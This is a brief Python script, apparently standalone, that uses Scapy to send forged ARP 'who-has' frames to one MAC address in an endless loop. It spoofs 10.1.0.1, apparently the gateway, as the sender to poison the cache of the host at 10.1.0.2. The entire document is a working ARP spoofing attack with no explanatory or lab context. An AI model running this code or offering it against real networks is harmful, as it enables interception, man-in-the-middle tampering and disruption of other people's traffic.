from scapy.all import *

sendp(Ether(dst='b6:dd:f1:44:42:50')/ARP(op='who-has', psrc='10.1.0.1', pdst='10.1.0.2'),
inter=0.2, loop=1)
